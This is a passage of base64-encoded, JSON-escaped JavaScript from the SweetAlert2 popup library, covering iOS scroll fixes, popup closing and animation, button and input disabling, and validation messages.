fGlQb2QvLnRlc3QobmF2aWdhdG9yLnVzZXJBZ2VudCkgJiYgIXdpbmRvdy5NU1N0cmVhbSB8fCBuYXZpZ2F0b3IucGxhdGZvcm0gPT09ICdNYWNJbnRlbCcgJiYgbmF2aWdhdG9yLm1heFRvdWNoUG9pbnRzID4gMTtcbiAgICBpZiAoaU9TICYmICFoYXNDbGFzcyhkb2N1bWVudC5ib2R5LCBzd2FsQ2xhc3Nlcy5pb3NmaXgpKSB7XG4gICAgICBjb25zdCBvZmZzZXQgPSBkb2N1bWVudC5ib2R5LnNjcm9sbFRvcDtcbiAgICAgIGRvY3VtZW50LmJvZHkuc3R5bGUudG9wID0gYCR7b2Zmc2V0ICogLTF9cHhgO1xuICAgICAgYWRkQ2xhc3MoZG9jdW1lbnQuYm9keSwgc3dhbENsYXNzZXMuaW9zZml4KTtcbiAgICAgIGxvY2tCb2R5U2Nyb2xsKCk7XG4gICAgICBhZGRCb3R0b21QYWRkaW5nRm9yVGFsbFBvcHVwcygpO1xuICAgIH1cbiAgfTtcblxuICAvKipcbiAgICogaHR0cHM6Ly9naXRodWIuY29tL3N3ZWV0YWxlcnQyL3N3ZWV0YWxlcnQyL2lzc3Vlcy8xOTQ4XG4gICAqL1xuICBjb25zdCBhZGRCb3R0b21QYWRkaW5nRm9yVGFsbFBvcHVwcyA9ICgpID0+IHtcbiAgICBjb25zdCB1YSA9IG5hdmlnYXRvci51c2VyQWdlbnQ7XG4gICAgY29uc3QgaU9TID0gISF1YS5tYXRjaCgvaVBhZC9pKSB8fCAhIXVhLm1hdGNoKC9pUGhvbmUvaSk7XG4gICAgY29uc3Qgd2Via2l0ID0gISF1YS5tYXRjaCgvV2ViS2l0L2kpO1xuICAgIGNvbnN0IGlPU1NhZmFyaSA9IGlPUyAmJiB3ZWJraXQgJiYgIXVhLm1hdGNoKC9DcmlPUy9pKTtcbiAgICBpZiAoaU9TU2FmYXJpKSB7XG4gICAgICBjb25zdCBib3R0b21QYW5lbEhlaWdodCA9IDQ0O1xuICAgICAgaWYgKGdldFBvcHVwKCkuc2Nyb2xsSGVpZ2h0ID4gd2luZG93LmlubmVySGVpZ2h0IC0gYm90dG9tUGFuZWxIZWlnaHQpIHtcbiAgICAgICAgZ2V0Q29udGFpbmVyKCkuc3R5bGUucGFkZGluZ0JvdHRvbSA9IGAke2JvdHRvbVBhbmVsSGVpZ2h0fXB4YDtcbiAgICAgIH1cbiAgICB9XG4gIH07XG5cbiAgLyoqXG4gICAqIGh0dHBzOi8vZ2l0aHViLmNvbS9zd2VldGFsZXJ0Mi9zd2VldGFsZXJ0Mi9pc3N1ZXMvMTI0NlxuICAgKi9cbiAgY29uc3QgbG9ja0JvZHlTY3JvbGwgPSAoKSA9PiB7XG4gICAgY29uc3QgY29udGFpbmVyID0gZ2V0Q29udGFpbmVyKCk7XG4gICAgbGV0IHByZXZlbnRUb3VjaE1vdmU7XG4gICAgLyoqXG4gICAgICogQHBhcmFtIHtUb3VjaEV2ZW50fSBldmVudFxuICAgICAqL1xuICAgIGNvbnRhaW5lci5vbnRvdWNoc3RhcnQgPSBldmVudCA9PiB7XG4gICAgICBwcmV2ZW50VG91Y2hNb3ZlID0gc2hvdWxkUHJldmVudFRvdWNoTW92ZShldmVudCk7XG4gICAgfTtcbiAgICAvKipcbiAgICAgKiBAcGFyYW0ge1RvdWNoRXZlbnR9IGV2ZW50XG4gICAgICovXG4gICAgY29udGFpbmVyLm9udG91Y2htb3ZlID0gZXZlbnQgPT4ge1xuICAgICAgaWYgKHByZXZlbnRUb3VjaE1vdmUpIHtcbiAgICAgICAgZXZlbnQucHJldmVudERlZmF1bHQoKTtcbiAgICAgICAgZXZlbnQuc3RvcFByb3BhZ2F0aW9uKCk7XG4gICAgICB9XG4gICAgfTtcbiAgfTtcblxuICAvKipcbiAgICogQHBhcmFtIHtUb3VjaEV2ZW50fSBldmVudFxuICAgKiBAcmV0dXJucyB7Ym9vbGVhbn1cbiAgICovXG4gIGNvbnN0IHNob3VsZFByZXZlbnRUb3VjaE1vdmUgPSBldmVudCA9PiB7XG4gICAgY29uc3QgdGFyZ2V0ID0gZXZlbnQudGFyZ2V0O1xuICAgIGNvbnN0IGNvbnRhaW5lciA9IGdldENvbnRhaW5lcigpO1xuICAgIGlmIChpc1N0eWx1cyhldmVudCkgfHwgaXNab29tKGV2ZW50KSkge1xuICAgICAgcmV0dXJuIGZhbHNlO1xuICAgIH1cbiAgICBpZiAodGFyZ2V0ID09PSBjb250YWluZXIpIHtcbiAgICAgIHJldHVybiB0cnVlO1xuICAgIH1cbiAgICBpZiAoIWlzU2Nyb2xsYWJsZShjb250YWluZXIpICYmIHRhcmdldCBpbnN0YW5jZW9mIEhUTUxFbGVtZW50ICYmIHRhcmdldC50YWdOYW1lICE9PSAnSU5QVVQnICYmXG4gICAgLy8gIzE2MDNcbiAgICB0YXJnZXQudGFnTmFtZSAhPT0gJ1RFWFRBUkVBJyAmJlxuICAgIC8vICMyMjY2XG4gICAgIShpc1Njcm9sbGFibGUoZ2V0SHRtbENvbnRhaW5lcigpKSAmJlxuICAgIC8vICMxOTQ0XG4gICAgZ2V0SHRtbENvbnRhaW5lcigpLmNvbnRhaW5zKHRhcmdldCkpKSB7XG4gICAgICByZXR1cm4gdHJ1ZTtcbiAgICB9XG4gICAgcmV0dXJuIGZhbHNlO1xuICB9O1xuXG4gIC8qKlxuICAgKiBodHRwczovL2dpdGh1Yi5jb20vc3dlZXRhbGVydDIvc3dlZXRhbGVydDIvaXNzdWVzLzE3ODZcbiAgICpcbiAgICogQHBhcmFtIHsqfSBldmVudFxuICAgKiBAcmV0dXJucyB7Ym9vbGVhbn1cbiAgICovXG4gIGNvbnN0IGlzU3R5bHVzID0gZXZlbnQgPT4ge1xuICAgIHJldHVybiBldmVudC50b3VjaGVzICYmIGV2ZW50LnRvdWNoZXMubGVuZ3RoICYmIGV2ZW50LnRvdWNoZXNbMF0udG91Y2hUeXBlID09PSAnc3R5bHVzJztcbiAgfTtcblxuICAvKipcbiAgICogaHR0cHM6Ly9naXRodWIuY29tL3N3ZWV0YWxlcnQyL3N3ZWV0YWxlcnQyL2lzc3Vlcy8xODkxXG4gICAqXG4gICAqIEBwYXJhbSB7VG91Y2hFdmVudH0gZXZlbnRcbiAgICogQHJldHVybnMge2Jvb2xlYW59XG4gICAqL1xuICBjb25zdCBpc1pvb20gPSBldmVudCA9PiB7XG4gICAgcmV0dXJuIGV2ZW50LnRvdWNoZXMgJiYgZXZlbnQudG91Y2hlcy5sZW5ndGggPiAxO1xuICB9O1xuICBjb25zdCB1bmRvSU9TZml4ID0gKCkgPT4ge1xuICAgIGlmIChoYXNDbGFzcyhkb2N1bWVudC5ib2R5LCBzd2FsQ2xhc3Nlcy5pb3NmaXgpKSB7XG4gICAgICBjb25zdCBvZmZzZXQgPSBwYXJzZUludChkb2N1bWVudC5ib2R5LnN0eWxlLnRvcCwgMTApO1xuICAgICAgcmVtb3ZlQ2xhc3MoZG9jdW1lbnQuYm9keSwgc3dhbENsYXNzZXMuaW9zZml4KTtcbiAgICAgIGRvY3VtZW50LmJvZHkuc3R5bGUudG9wID0gJyc7XG4gICAgICBkb2N1bWVudC5ib2R5LnNjcm9sbFRvcCA9IG9mZnNldCAqIC0xO1xuICAgIH1cbiAgfTtcblxuICBjb25zdCBmaXhTY3JvbGxiYXIgPSAoKSA9PiB7XG4gICAgLy8gZm9yIHF1ZXVlcywgZG8gbm90IGRvIHRoaXMgbW9yZSB0aGFuIG9uY2VcbiAgICBpZiAoc3RhdGVzLnByZXZpb3VzQm9keVBhZGRpbmcgIT09IG51bGwpIHtcbiAgICAgIHJldHVybjtcbiAgICB9XG4gICAgLy8gaWYgdGhlIGJvZHkgaGFzIG92ZXJmbG93XG4gICAgaWYgKGRvY3VtZW50LmJvZHkuc2Nyb2xsSGVpZ2h0ID4gd2luZG93LmlubmVySGVpZ2h0KSB7XG4gICAgICAvLyBhZGQgcGFkZGluZyBzbyB0aGUgY29udGVudCBkb2Vzbid0IHNoaWZ0IGFmdGVyIHJlbW92YWwgb2Ygc2Nyb2xsYmFyXG4gICAgICBzdGF0ZXMucHJldmlvdXNCb2R5UGFkZGluZyA9IHBhcnNlSW50KHdpbmRvdy5nZXRDb21wdXRlZFN0eWxlKGRvY3VtZW50LmJvZHkpLmdldFByb3BlcnR5VmFsdWUoJ3BhZGRpbmctcmlnaHQnKSk7XG4gICAgICBkb2N1bWVudC5ib2R5LnN0eWxlLnBhZGRpbmdSaWdodCA9IGAke3N0YXRlcy5wcmV2aW91c0JvZHlQYWRkaW5nICsgbWVhc3VyZVNjcm9sbGJhcigpfXB4YDtcbiAgICB9XG4gIH07XG4gIGNvbnN0IHVuZG9TY3JvbGxiYXIgPSAoKSA9PiB7XG4gICAgaWYgKHN0YXRlcy5wcmV2aW91c0JvZHlQYWRkaW5nICE9PSBudWxsKSB7XG4gICAgICBkb2N1bWVudC5ib2R5LnN0eWxlLnBhZGRpbmdSaWdodCA9IGAke3N0YXRlcy5wcmV2aW91c0JvZHlQYWRkaW5nfXB4YDtcbiAgICAgIHN0YXRlcy5wcmV2aW91c0JvZHlQYWRkaW5nID0gbnVsbDtcbiAgICB9XG4gIH07XG5cbiAgLyoqXG4gICAqIEBwYXJhbSB7U3dlZXRBbGVydDJ9IGluc3RhbmNlXG4gICAqIEBwYXJhbSB7SFRNTEVsZW1lbnR9IGNvbnRhaW5lclxuICAgKiBAcGFyYW0ge2Jvb2xlYW59IHJldHVybkZvY3VzXG4gICAqIEBwYXJhbSB7RnVuY3Rpb259IGRpZENsb3NlXG4gICAqL1xuICBmdW5jdGlvbiByZW1vdmVQb3B1cEFuZFJlc2V0U3RhdGUoaW5zdGFuY2UsIGNvbnRhaW5lciwgcmV0dXJuRm9jdXMsIGRpZENsb3NlKSB7XG4gICAgaWYgKGlzVG9hc3QoKSkge1xuICAgICAgdHJpZ2dlckRpZENsb3NlQW5kRGlzcG9zZShpbnN0YW5jZSwgZGlkQ2xvc2UpO1xuICAgIH0gZWxzZSB7XG4gICAgICByZXN0b3JlQWN0aXZlRWxlbWVudChyZXR1cm5Gb2N1cykudGhlbigoKSA9PiB0cmlnZ2VyRGlkQ2xvc2VBbmREaXNwb3NlKGluc3RhbmNlLCBkaWRDbG9zZSkpO1xuICAgICAgcmVtb3ZlS2V5ZG93bkhhbmRsZXIoZ2xvYmFsU3RhdGUpO1xuICAgIH1cbiAgICBjb25zdCBpc1NhZmFyaSA9IC9eKCg/IWNocm9tZXxhbmRyb2lkKS4pKnNhZmFyaS9pLnRlc3QobmF2aWdhdG9yLnVzZXJBZ2VudCk7XG4gICAgLy8gd29ya2Fyb3VuZCBmb3IgIzIwODhcbiAgICAvLyBmb3Igc29tZSByZWFzb24gcmVtb3ZpbmcgdGhlIGNvbnRhaW5lciBpbiBTYWZhcmkgd2lsbCBzY3JvbGwgdGhlIGRvY3VtZW50IHRvIGJvdHRvbVxuICAgIGlmIChpc1NhZmFyaSkge1xuICAgICAgY29udGFpbmVyLnNldEF0dHJpYnV0ZSgnc3R5bGUnLCAnZGlzcGxheTpub25lICFpbXBvcnRhbnQnKTtcbiAgICAgIGNvbnRhaW5lci5yZW1vdmVBdHRyaWJ1dGUoJ2NsYXNzJyk7XG4gICAgICBjb250YWluZXIuaW5uZXJIVE1MID0gJyc7XG4gICAgfSBlbHNlIHtcbiAgICAgIGNvbnRhaW5lci5yZW1vdmUoKTtcbiAgICB9XG4gICAgaWYgKGlzTW9kYWwoKSkge1xuICAgICAgdW5kb1Njcm9sbGJhcigpO1xuICAgICAgdW5kb0lPU2ZpeCgpO1xuICAgICAgdW5zZXRBcmlhSGlkZGVuKCk7XG4gICAgfVxuICAgIHJlbW92ZUJvZHlDbGFzc2VzKCk7XG4gIH1cblxuICAvKipcbiAgICogUmVtb3ZlIFN3ZWV0QWxlcnQyIGNsYXNzZXMgZnJvbSBib2R5XG4gICAqL1xuICBmdW5jdGlvbiByZW1vdmVCb2R5Q2xhc3NlcygpIHtcbiAgICByZW1vdmVDbGFzcyhbZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50LCBkb2N1bWVudC5ib2R5XSwgW3N3YWxDbGFzc2VzLnNob3duLCBzd2FsQ2xhc3Nlc1snaGVpZ2h0LWF1dG8nXSwgc3dhbENsYXNzZXNbJ25vLWJhY2tkcm9wJ10sIHN3YWxDbGFzc2VzWyd0b2FzdC1zaG93biddXSk7XG4gIH1cblxuICAvKipcbiAgICogSW5zdGFuY2UgbWV0aG9kIHRvIGNsb3NlIHN3ZWV0QWxlcnRcbiAgICpcbiAgICogQHBhcmFtIHthbnl9IHJlc29sdmVWYWx1ZVxuICAgKi9cbiAgZnVuY3Rpb24gY2xvc2UocmVzb2x2ZVZhbHVlKSB7XG4gICAgcmVzb2x2ZVZhbHVlID0gcHJlcGFyZVJlc29sdmVWYWx1ZShyZXNvbHZlVmFsdWUpO1xuICAgIGNvbnN0IHN3YWxQcm9taXNlUmVzb2x2ZSA9IHByaXZhdGVNZXRob2RzLnN3YWxQcm9taXNlUmVzb2x2ZS5nZXQodGhpcyk7XG4gICAgY29uc3QgZGlkQ2xvc2UgPSB0cmlnZ2VyQ2xvc2VQb3B1cCh0aGlzKTtcbiAgICBpZiAodGhpcy5pc0F3YWl0aW5nUHJvbWlzZSgpKSB7XG4gICAgICAvLyBBIHN3YWwgYXdhaXRpbmcgZm9yIGEgcHJvbWlzZSAoYWZ0ZXIgYSBjbGljayBvbiBDb25maXJtIG9yIERlbnkpIGNhbm5vdCBiZSBkaXNtaXNzZWQgYW55bW9yZSAjMjMzNVxuICAgICAgaWYgKCFyZXNvbHZlVmFsdWUuaXNEaXNtaXNzZWQpIHtcbiAgICAgICAgaGFuZGxlQXdhaXRpbmdQcm9taXNlKHRoaXMpO1xuICAgICAgICBzd2FsUHJvbWlzZVJlc29sdmUocmVzb2x2ZVZhbHVlKTtcbiAgICAgIH1cbiAgICB9IGVsc2UgaWYgKGRpZENsb3NlKSB7XG4gICAgICAvLyBSZXNvbHZlIFN3YWwgcHJvbWlzZVxuICAgICAgc3dhbFByb21pc2VSZXNvbHZlKHJlc29sdmVWYWx1ZSk7XG4gICAgfVxuICB9XG5cbiAgLyoqXG4gICAqIEByZXR1cm5zIHtib29sZWFufVxuICAgKi9cbiAgZnVuY3Rpb24gaXNBd2FpdGluZ1Byb21pc2UoKSB7XG4gICAgcmV0dXJuICEhcHJpdmF0ZVByb3BzLmF3YWl0aW5nUHJvbWlzZS5nZXQodGhpcyk7XG4gIH1cbiAgY29uc3QgdHJpZ2dlckNsb3NlUG9wdXAgPSBpbnN0YW5jZSA9PiB7XG4gICAgY29uc3QgcG9wdXAgPSBnZXRQb3B1cCgpO1xuICAgIGlmICghcG9wdXApIHtcbiAgICAgIHJldHVybiBmYWxzZTtcbiAgICB9XG4gICAgY29uc3QgaW5uZXJQYXJhbXMgPSBwcml2YXRlUHJvcHMuaW5uZXJQYXJhbXMuZ2V0KGluc3RhbmNlKTtcbiAgICBpZiAoIWlubmVyUGFyYW1zIHx8IGhhc0NsYXNzKHBvcHVwLCBpbm5lclBhcmFtcy5oaWRlQ2xhc3MucG9wdXApKSB7XG4gICAgICByZXR1cm4gZmFsc2U7XG4gICAgfVxuICAgIHJlbW92ZUNsYXNzKHBvcHVwLCBpbm5lclBhcmFtcy5zaG93Q2xhc3MucG9wdXApO1xuICAgIGFkZENsYXNzKHBvcHVwLCBpbm5lclBhcmFtcy5oaWRlQ2xhc3MucG9wdXApO1xuICAgIGNvbnN0IGJhY2tkcm9wID0gZ2V0Q29udGFpbmVyKCk7XG4gICAgcmVtb3ZlQ2xhc3MoYmFja2Ryb3AsIGlubmVyUGFyYW1zLnNob3dDbGFzcy5iYWNrZHJvcCk7XG4gICAgYWRkQ2xhc3MoYmFja2Ryb3AsIGlubmVyUGFyYW1zLmhpZGVDbGFzcy5iYWNrZHJvcCk7XG4gICAgaGFuZGxlUG9wdXBBbmltYXRpb24oaW5zdGFuY2UsIHBvcHVwLCBpbm5lclBhcmFtcyk7XG4gICAgcmV0dXJuIHRydWU7XG4gIH07XG5cbiAgLyoqXG4gICAqIEBwYXJhbSB7YW55fSBlcnJvclxuICAgKi9cbiAgZnVuY3Rpb24gcmVqZWN0UHJvbWlzZShlcnJvcikge1xuICAgIGNvbnN0IHJlamVjdFByb21pc2UgPSBwcml2YXRlTWV0aG9kcy5zd2FsUHJvbWlzZVJlamVjdC5nZXQodGhpcyk7XG4gICAgaGFuZGxlQXdhaXRpbmdQcm9taXNlKHRoaXMpO1xuICAgIGlmIChyZWplY3RQcm9taXNlKSB7XG4gICAgICAvLyBSZWplY3QgU3dhbCBwcm9taXNlXG4gICAgICByZWplY3RQcm9taXNlKGVycm9yKTtcbiAgICB9XG4gIH1cblxuICAvKipcbiAgICogQHBhcmFtIHtTd2VldEFsZXJ0Mn0gaW5zdGFuY2VcbiAgICovXG4gIGNvbnN0IGhhbmRsZUF3YWl0aW5nUHJvbWlzZSA9IGluc3RhbmNlID0+IHtcbiAgICAvLyBAdHMtaWdub3JlXG4gICAgaWYgKGluc3RhbmNlLmlzQXdhaXRpbmdQcm9taXNlKCkpIHtcbiAgICAgIHByaXZhdGVQcm9wcy5hd2FpdGluZ1Byb21pc2UuZGVsZXRlKGluc3RhbmNlKTtcbiAgICAgIC8vIFRoZSBpbnN0YW5jZSBtaWdodCBoYXZlIGJlZW4gcHJldmlvdXNseSBwYXJ0bHkgZGVzdHJveWVkLCB3ZSBtdXN0IHJlc3VtZSB0aGUgZGVzdHJveSBwcm9jZXNzIGluIHRoaXMgY2FzZSAjMjMzNVxuICAgICAgaWYgKCFwcml2YXRlUHJvcHMuaW5uZXJQYXJhbXMuZ2V0KGluc3RhbmNlKSkge1xuICAgICAgICAvLyBAdHMtaWdub3JlXG4gICAgICAgIGluc3RhbmNlLl9kZXN0cm95KCk7XG4gICAgICB9XG4gICAgfVxuICB9O1xuXG4gIC8qKlxuICAgKiBAcGFyYW0ge2FueX0gcmVzb2x2ZVZhbHVlXG4gICAqIEByZXR1cm5zIHtTd2VldEFsZXJ0UmVzdWx0fVxuICAgKi9cbiAgY29uc3QgcHJlcGFyZVJlc29sdmVWYWx1ZSA9IHJlc29sdmVWYWx1ZSA9PiB7XG4gICAgLy8gV2hlbiB1c2VyIGNhbGxzIFN3YWwuY2xvc2UoKVxuICAgIGlmICh0eXBlb2YgcmVzb2x2ZVZhbHVlID09PSAndW5kZWZpbmVkJykge1xuICAgICAgcmV0dXJuIHtcbiAgICAgICAgaXNDb25maXJtZWQ6IGZhbHNlLFxuICAgICAgICBpc0RlbmllZDogZmFsc2UsXG4gICAgICAgIGlzRGlzbWlzc2VkOiB0cnVlXG4gICAgICB9O1xuICAgIH1cbiAgICByZXR1cm4gT2JqZWN0LmFzc2lnbih7XG4gICAgICBpc0NvbmZpcm1lZDogZmFsc2UsXG4gICAgICBpc0RlbmllZDogZmFsc2UsXG4gICAgICBpc0Rpc21pc3NlZDogZmFsc2VcbiAgICB9LCByZXNvbHZlVmFsdWUpO1xuICB9O1xuXG4gIC8qKlxuICAgKiBAcGFyYW0ge1N3ZWV0QWxlcnQyfSBpbnN0YW5jZVxuICAgKiBAcGFyYW0ge0hUTUxFbGVtZW50fSBwb3B1cFxuICAgKiBAcGFyYW0ge1N3ZWV0QWxlcnRPcHRpb25zfSBpbm5lclBhcmFtc1xuICAgKi9cbiAgY29uc3QgaGFuZGxlUG9wdXBBbmltYXRpb24gPSAoaW5zdGFuY2UsIHBvcHVwLCBpbm5lclBhcmFtcykgPT4ge1xuICAgIGNvbnN0IGNvbnRhaW5lciA9IGdldENvbnRhaW5lcigpO1xuICAgIC8vIElmIGFuaW1hdGlvbiBpcyBzdXBwb3J0ZWQsIGFuaW1hdGVcbiAgICBjb25zdCBhbmltYXRpb25Jc1N1cHBvcnRlZCA9IGFuaW1hdGlvbkVuZEV2ZW50ICYmIGhhc0Nzc0FuaW1hdGlvbihwb3B1cCk7XG4gICAgaWYgKHR5cGVvZiBpbm5lclBhcmFtcy53aWxsQ2xvc2UgPT09ICdmdW5jdGlvbicpIHtcbiAgICAgIGlubmVyUGFyYW1zLndpbGxDbG9zZShwb3B1cCk7XG4gICAgfVxuICAgIGlmIChhbmltYXRpb25Jc1N1cHBvcnRlZCkge1xuICAgICAgYW5pbWF0ZVBvcHVwKGluc3RhbmNlLCBwb3B1cCwgY29udGFpbmVyLCBpbm5lclBhcmFtcy5yZXR1cm5Gb2N1cywgaW5uZXJQYXJhbXMuZGlkQ2xvc2UpO1xuICAgIH0gZWxzZSB7XG4gICAgICAvLyBPdGhlcndpc2UsIHJlbW92ZSBpbW1lZGlhdGVseVxuICAgICAgcmVtb3ZlUG9wdXBBbmRSZXNldFN0YXRlKGluc3RhbmNlLCBjb250YWluZXIsIGlubmVyUGFyYW1zLnJldHVybkZvY3VzLCBpbm5lclBhcmFtcy5kaWRDbG9zZSk7XG4gICAgfVxuICB9O1xuXG4gIC8qKlxuICAgKiBAcGFyYW0ge1N3ZWV0QWxlcnQyfSBpbnN0YW5jZVxuICAgKiBAcGFyYW0ge0hUTUxFbGVtZW50fSBwb3B1cFxuICAgKiBAcGFyYW0ge0hUTUxFbGVtZW50fSBjb250YWluZXJcbiAgICogQHBhcmFtIHtib29sZWFufSByZXR1cm5Gb2N1c1xuICAgKiBAcGFyYW0ge0Z1bmN0aW9ufSBkaWRDbG9zZVxuICAgKi9cbiAgY29uc3QgYW5pbWF0ZVBvcHVwID0gKGluc3RhbmNlLCBwb3B1cCwgY29udGFpbmVyLCByZXR1cm5Gb2N1cywgZGlkQ2xvc2UpID0+IHtcbiAgICBnbG9iYWxTdGF0ZS5zd2FsQ2xvc2VFdmVudEZpbmlzaGVkQ2FsbGJhY2sgPSByZW1vdmVQb3B1cEFuZFJlc2V0U3RhdGUuYmluZChudWxsLCBpbnN0YW5jZSwgY29udGFpbmVyLCByZXR1cm5Gb2N1cywgZGlkQ2xvc2UpO1xuICAgIHBvcHVwLmFkZEV2ZW50TGlzdGVuZXIoYW5pbWF0aW9uRW5kRXZlbnQsIGZ1bmN0aW9uIChlKSB7XG4gICAgICBpZiAoZS50YXJnZXQgPT09IHBvcHVwKSB7XG4gICAgICAgIGdsb2JhbFN0YXRlLnN3YWxDbG9zZUV2ZW50RmluaXNoZWRDYWxsYmFjaygpO1xuICAgICAgICBkZWxldGUgZ2xvYmFsU3RhdGUuc3dhbENsb3NlRXZlbnRGaW5pc2hlZENhbGxiYWNrO1xuICAgICAgfVxuICAgIH0pO1xuICB9O1xuXG4gIC8qKlxuICAgKiBAcGFyYW0ge1N3ZWV0QWxlcnQyfSBpbnN0YW5jZVxuICAgKiBAcGFyYW0ge0Z1bmN0aW9ufSBkaWRDbG9zZVxuICAgKi9cbiAgY29uc3QgdHJpZ2dlckRpZENsb3NlQW5kRGlzcG9zZSA9IChpbnN0YW5jZSwgZGlkQ2xvc2UpID0+IHtcbiAgICBzZXRUaW1lb3V0KCgpID0+IHtcbiAgICAgIGlmICh0eXBlb2YgZGlkQ2xvc2UgPT09ICdmdW5jdGlvbicpIHtcbiAgICAgICAgLy8gQHRzLWlnbm9yZVxuICAgICAgICBkaWRDbG9zZS5iaW5kKGluc3RhbmNlLnBhcmFtcykoKTtcbiAgICAgIH1cbiAgICAgIC8vIEB0cy1pZ25vcmVcbiAgICAgIGluc3RhbmNlLl9kZXN0cm95KCk7XG4gICAgfSk7XG4gIH07XG5cbiAgLyoqXG4gICAqIEBwYXJhbSB7U3dlZXRBbGVydDJ9IGluc3RhbmNlXG4gICAqIEBwYXJhbSB7c3RyaW5nW119IGJ1dHRvbnNcbiAgICogQHBhcmFtIHtib29sZWFufSBkaXNhYmxlZFxuICAgKi9cbiAgZnVuY3Rpb24gc2V0QnV0dG9uc0Rpc2FibGVkKGluc3RhbmNlLCBidXR0b25zLCBkaXNhYmxlZCkge1xuICAgIGNvbnN0IGRvbUNhY2hlID0gcHJpdmF0ZVByb3BzLmRvbUNhY2hlLmdldChpbnN0YW5jZSk7XG4gICAgYnV0dG9ucy5mb3JFYWNoKGJ1dHRvbiA9PiB7XG4gICAgICBkb21DYWNoZVtidXR0b25dLmRpc2FibGVkID0gZGlzYWJsZWQ7XG4gICAgfSk7XG4gIH1cblxuICAvKipcbiAgICogQHBhcmFtIHtIVE1MSW5wdXRFbGVtZW50fSBpbnB1dFxuICAgKiBAcGFyYW0ge2Jvb2xlYW59IGRpc2FibGVkXG4gICAqL1xuICBmdW5jdGlvbiBzZXRJbnB1dERpc2FibGVkKGlucHV0LCBkaXNhYmxlZCkge1xuICAgIGlmICghaW5wdXQpIHtcbiAgICAgIHJldHVybjtcbiAgICB9XG4gICAgaWYgKGlucHV0LnR5cGUgPT09ICdyYWRpbycpIHtcbiAgICAgIGNvbnN0IHJhZGlvc0NvbnRhaW5lciA9IGlucHV0LnBhcmVudE5vZGUucGFyZW50Tm9kZTtcbiAgICAgIGNvbnN0IHJhZGlvcyA9IHJhZGlvc0NvbnRhaW5lci5xdWVyeVNlbGVjdG9yQWxsKCdpbnB1dCcpO1xuICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCByYWRpb3MubGVuZ3RoOyBpKyspIHtcbiAgICAgICAgcmFkaW9zW2ldLmRpc2FibGVkID0gZGlzYWJsZWQ7XG4gICAgICB9XG4gICAgfSBlbHNlIHtcbiAgICAgIGlucHV0LmRpc2FibGVkID0gZGlzYWJsZWQ7XG4gICAgfVxuICB9XG5cbiAgLyoqXG4gICAqIEVuYWJsZSBhbGwgdGhlIGJ1dHRvbnNcbiAgICovXG4gIGZ1bmN0aW9uIGVuYWJsZUJ1dHRvbnMoKSB7XG4gICAgc2V0QnV0dG9uc0Rpc2FibGVkKHRoaXMsIFsnY29uZmlybUJ1dHRvbicsICdkZW55QnV0dG9uJywgJ2NhbmNlbEJ1dHRvbiddLCBmYWxzZSk7XG4gIH1cblxuICAvKipcbiAgICogRGlzYWJsZSBhbGwgdGhlIGJ1dHRvbnNcbiAgICovXG4gIGZ1bmN0aW9uIGRpc2FibGVCdXR0b25zKCkge1xuICAgIHNldEJ1dHRvbnNEaXNhYmxlZCh0aGlzLCBbJ2NvbmZpcm1CdXR0b24nLCAnZGVueUJ1dHRvbicsICdjYW5jZWxCdXR0b24nXSwgdHJ1ZSk7XG4gIH1cblxuICAvKipcbiAgICogRW5hYmxlIHRoZSBpbnB1dCBmaWVsZFxuICAgKi9cbiAgZnVuY3Rpb24gZW5hYmxlSW5wdXQoKSB7XG4gICAgc2V0SW5wdXREaXNhYmxlZCh0aGlzLmdldElucHV0KCksIGZhbHNlKTtcbiAgfVxuXG4gIC8qKlxuICAgKiBEaXNhYmxlIHRoZSBpbnB1dCBmaWVsZFxuICAgKi9cbiAgZnVuY3Rpb24gZGlzYWJsZUlucHV0KCkge1xuICAgIHNldElucHV0RGlzYWJsZWQodGhpcy5nZXRJbnB1dCgpLCB0cnVlKTtcbiAgfVxuXG4gIC8qKlxuICAgKiBTaG93IGJsb2NrIHdpdGggdmFsaWRhdGlvbiBtZXNzYWdlXG4gICAqXG4gICAqIEBwYXJhbSB7c3RyaW5nfSBlcnJvclxuICAgKi9cbiAgZnVuY3Rpb24gc2hvd1ZhbGlkYXRpb25NZXNzYWdlKGVycm9yKSB7XG4gICAgY29uc3QgZG9tQ2FjaGUgPSBwcml2YXRlUHJvcHMuZG9tQ2FjaGUuZ2V0KHRoaXMpO1xuICAgIGNvbnN0IHBhcmFtcyA9IHByaXZhdGVQcm9wcy5pbm5lclBhcmFtcy5nZXQodGhpcyk7XG4gICAgc2V0SW5uZXJIdG1sKGRvbUNhY2hlLnZhbGlkYXRpb25NZXNzYWdlLCBlcnJvcik7XG4gICAgZG9tQ2FjaGUudmFsaWRhdGlvbk1lc3NhZ2UuY2xhc3NOYW1lID0gc3dhbENsYXNzZXNbJ3ZhbGlkYXRpb24tbWVzc2FnZSddO1xuICAgIGlmIChwYXJhbXMuY3VzdG9tQ2xhc3MgJiYgcGFyYW1zLmN1c3RvbUNsYXNzLnZhbGlkYXRpb25NZXNzYWdlKSB7XG4gICAgICBhZGRDbGFzcyhkb21DYWNoZS52YWxpZGF0aW9uTWVzc2FnZSwgcGFyYW1zLmN1c3RvbUNsYXNzLnZhbGlkYXRpb25NZXNzYWdlKTtcbiAgICB9XG4gICAgc2hvdyhkb21DYWNoZS52YWxpZGF0aW9uTWVzc2FnZSk7XG4gICAgY29uc3QgaW5wdXQgPSB0aGlzLmdldElucHV0KCk7XG4gICAgaWYgKGlucHV0KSB7XG4gICAgICBpbnB1dC5zZXRBdHRyaWJ1dGUoJ2FyaWEtaW52YWxpZCcsIHRydWUpO1xuICAgICAgaW5wdXQuc2V0QXR0cmlidXRlKCdhcmlhLWRlc2NyaWJlZGJ5Jywgc3dhbENsYXNzZXNbJ3ZhbGlkYXRpb24tbWVzc2FnZSddKTtcbiAgICAgIGZvY3VzSW5wdXQoaW5wdXQpO1xuICAgICAgYWRkQ2xhc3MoaW5wdXQsIHN3YWxDbGFzc2VzLmlucHV0ZXJyb3IpO1xuICAgIH1cbiAgfVxuXG4gIC8qKlxuICAgKiBIaWRlIGJsb2NrIHdpdGggdmFsaWRhdGlvbiBtZXNzYWdlXG4gICAqL1xuICBmdW5jdGlvbiByZXNldFZhbGlkYXRpb25NZXNzYWdlKCkge1xuICAgIGNvbnN0IGRvbUNhY2hlID0gcHJpdmF0ZVByb3BzLmRvbUNhY2hlLmdldCh0aGlzKTtcbiAgICBpZiAoZG9tQ2FjaGUudmFsaWRhdGlvbk1lc3NhZ2UpIHtcbiAgICAgIGhpZGUoZG9tQ2FjaGUudmFsaWRhdGlv